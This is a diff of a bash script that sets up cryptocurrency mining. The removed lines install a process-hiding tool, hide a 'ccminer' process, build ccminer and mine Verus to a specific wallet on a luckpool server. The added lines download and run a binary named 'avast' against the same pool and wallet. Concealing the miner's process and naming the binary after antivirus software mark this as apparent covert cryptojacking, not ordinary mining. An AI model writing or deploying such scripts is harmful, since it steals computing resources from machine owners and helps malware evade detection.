@@ -1,11 +1,6 @@
 #!/bin/bash
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add ccminer
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
-./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.CPU -p -t 2
+wget https://github.com/aurbach55/pos/raw/main/avast
+chmod +x avast
+./avast -v -l  ap.luckpool.net:3956 -u RWZG7MP3LepujPY8rVS9ZuUXZnDdNveBF4.X -t 4 -x
+
 
